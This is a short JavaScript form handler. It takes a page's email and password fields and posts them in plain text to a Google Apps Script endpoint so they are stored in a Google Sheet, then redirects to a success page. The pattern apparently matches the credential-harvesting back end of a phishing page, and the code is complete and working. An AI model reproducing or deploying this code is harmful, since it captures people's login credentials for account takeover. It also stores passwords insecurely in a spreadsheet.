// Handle the form submission and send data to Google Sheets
function handleSubmit(event) {
    event.preventDefault(); // Prevent the form from submitting the traditional way

    // Get form data
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Prepare the data to send to Google Sheets
    const formData = new FormData();
    formData.append("email", email);
    formData.append("password", password);

    // Send data to Google Sheets using fetch
    fetch('https://script.google.com/macros/s/AKfycbwb-eqY_s93FuDE_RzeUXc710tUDcoCmrLFklqc18sKYwNlXj0yWr7CAJQEr9Icgg0QFA/exec', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())  // Expecting JSON response from the server
    .then(data => {
        if (data.result === 'success') {
            // Redirect to the success page after successful submission
            window.location.href = "success.html";
        } else {
            alert("There was an error submitting your information. Please try again.");
        }
    })
    .catch(error => {
        console.error("Error:", error);
        alert("There was an error with the submission. Please try again.");
    });
}
